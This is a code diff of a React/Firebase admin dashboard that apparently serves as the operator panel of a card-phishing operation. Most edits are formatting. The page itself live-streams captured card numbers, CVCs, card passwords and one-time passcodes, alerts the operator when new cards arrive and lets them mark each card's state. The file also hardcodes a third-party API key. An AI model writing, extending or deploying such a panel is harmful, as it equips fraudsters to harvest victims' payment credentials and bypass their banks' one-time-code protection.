@@ -1,18 +1,18 @@
-'use client';
+"use client";
 
-import { useState, useEffect, useCallback } from 'react';
-import { useRouter } from 'next/navigation';
-import { Trash2 } from 'lucide-react';
-import { Button } from '@/components/ui/button';
-import { Badge } from '@/components/ui/badge';
+import { useState, useEffect, useCallback } from "react";
+import { useRouter } from "next/navigation";
+import { Trash2 } from "lucide-react";
+import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
 import {
   Dialog,
   DialogContent,
   DialogDescription,
   DialogHeader,
   DialogTitle,
-} from '@/components/ui/dialog';
-import { db, auth } from '@/lib/firestore';
+} from "@/components/ui/dialog";
+import { db, auth } from "@/lib/firestore";
 import {
   collection,
   getDocs,
@@ -22,10 +22,10 @@ import {
   writeBatch,
   updateDoc,
   query,
-  onSnapshot
-} from 'firebase/firestore';
-import { onAuthStateChanged, signOut } from 'firebase/auth';
-import { CardsByID } from '@/components/cards';
+  onSnapshot,
+} from "firebase/firestore";
+import { onAuthStateChanged, signOut } from "firebase/auth";
+import { CardsByID } from "@/components/cards";
 
 interface UserData {
   id: string;
@@ -36,41 +36,43 @@ interface UserData {
   data?: any;
 }
 interface CardData {
-  id:string;
+  id: string;
   cardNumber: string;
   cvc: string;
-  pass:string;
-  otp:string;
-  prefix:string;
-  month:string;
-  yeer:string;
-              bank:string;
+  pass: string;
+  otp: string;
+  prefix: string;
+  month: string;
+  yeer: string;
+  bank: string;
 
-  otpall:string[]
+  otpall: string[];
   // Add other fields as needed
 }
 function cleanString(input: string) {
-  return input.replace(/[^a-zA-Z0-9 ]/g, '');
+  return input.replace(/[^a-zA-Z0-9 ]/g, "");
 }
 
 export default function NotificationsPage() {
   const [userData, setUserData] = useState<UserData[]>([]);
   const [cardData, setCardData] = useState<CardData[] | any>([]);
   const [isLoading, setIsLoading] = useState(true);
-  const [selectedInfo, setSelectedInfo] = useState<'personal' | 'card' | null>(null);
+  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(
+    null
+  );
   const [selectedUser, setSelectedUser] = useState<UserData | null>(null);
   const [showNotification, setShowNotification] = useState(false);
   const router = useRouter();
 
   const playNotificationSound = useCallback(() => {
-    const audio = new Audio('/audio/notif.wav');
-    audio.play().catch(error => console.error('Error playing audio:', error));
+    const audio = new Audio("/audio/notif.wav");
+    audio.play().catch((error) => console.error("Error playing audio:", error));
   }, []);
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
       if (!user) {
-        router.push('/login');
+        router.push("/login");
       } else {
         fetchUserData();
       }
@@ -82,13 +84,15 @@ export default function NotificationsPage() {
   const fetchUserData = async () => {
     setIsLoading(true);
     try {
-      const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4');
+      const response = await fetch(
+        "https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4"
+      );
       const result = await response.json();
       const _id = cleanString(result.ip);
 
-      const usersCollection = collection(db, 'users');
-      const cardsCollection = collection(db, 'orders');
-            const usersQuery =query(usersCollection);
+      const usersCollection = collection(db, "users");
+      const cardsCollection = collection(db, "orders");
+      const usersQuery = query(usersCollection);
       const cardsQuery = query(cardsCollection);
 
       const unsubscribeUsers = onSnapshot(usersQuery, (querySnapshot) => {
@@ -126,11 +130,11 @@ export default function NotificationsPage() {
             month: cardData.month,
             yeer: cardData.yeer,
             bank: cardData.bank,
-            otpall: cardData.otpall
+            otpall: cardData.otpall,
           });
         });
         setCardData(cardsdata);
-if (cardsdata.length > cardData.length) {
+        if (cardsdata.length > cardData.length) {
           playNotificationSound();
           setShowNotification(true);
         }
@@ -141,7 +145,7 @@ if (cardsdata.length > cardData.length) {
         unsubscribeCards();
       };
     } catch (error) {
-      console.error('Error fetching user data:', error);
+      console.error("Error fetching user data:", error);
       setIsLoading(false);
     }
   };
@@ -151,13 +155,13 @@ if (cardsdata.length > cardData.length) {
     try {
       const batch = writeBatch(db);
       userData.forEach((user) => {
-        const docRef = doc(db, 'users', user.id);
+        const docRef = doc(db, "users", user.id);
         batch.delete(docRef);
       });
       await batch.commit();
       setUserData([]);
     } catch (error) {
-      console.error('Error clearing user data:', error);
+      console.error("Error clearing user data:", error);
     } finally {
       setIsLoading(false);
     }
@@ -165,15 +169,15 @@ if (cardsdata.length > cardData.length) {
 
   const handleDelete = async (uid: string) => {
     try {
-      await deleteDoc(doc(db, 'users', uid));
+      await deleteDoc(doc(db, "users", uid));
       setUserData(userData.filter((user) => user.id !== uid));
     } catch (error) {
-      console.error('Error deleting user data:', error);
+      console.error("Error deleting user data:", error);
     }
   };
 
   const handleApproval = async (state: string, id: string) => {
-    const targetPost = doc(db, 'pays', id);
+    const targetPost = doc(db, "pays", id);
     await updateDoc(targetPost, {
       cardState: state,
     });
@@ -182,13 +186,13 @@ if (cardsdata.length > cardData.length) {
   const handleLogout = async () => {
     try {
       await signOut(auth);
-      router.push('/login');
+      router.push("/login");
     } catch (error) {
-      console.error('Error signing out:', error);
+      console.error("Error signing out:", error);
     }
   };
 
-  const handleInfoClick = (user: UserData, infoType: 'personal' | 'card') => {
+  const handleInfoClick = (user: UserData, infoType: "personal" | "card") => {
     setSelectedUser(user);
     setSelectedInfo(infoType);
   };
@@ -254,11 +258,17 @@ if (cardsdata.length > cardData.length) {
                   <td className="px-4 py-3">
                     <div className="flex flex-col sm:flex-row gap-2 justify-center">
                       <Badge
-                        variant={user.data ? 'default' : 'destructive'}
+                        variant={
+                          user.data
+                            ? cardData.some((card) => card.id === user.id)
+                              ? "secondary"
+                              : "default"
+                            : "destructive"
+                        }
                         className="rounded-md cursor-pointer"
-                        onClick={() => handleInfoClick(user, 'personal')}
+                        onClick={() => handleInfoClick(user, "personal")}
                       >
-                        {user.id ? 'عرض البيانات' : 'لا توجد بيانات'}
+                        {user.id ? "عرض البيانات" : "لا توجد بيانات"}
                       </Badge>
                     </div>
                   </td>
@@ -288,15 +298,12 @@ if (cardsdata.length > cardData.length) {
           {selectedUser && selectedUser.data && (
             <div className="space-y-2">
               <pre className="whitespace-pre-wrap overflow-x-auto">
-              <CardsByID id={selectedUser.id}/>
+                <CardsByID id={selectedUser.id} />
               </pre>
             </div>
           )}
         </DialogContent>
       </Dialog>
-
-      
     </div>
   );
 }
-
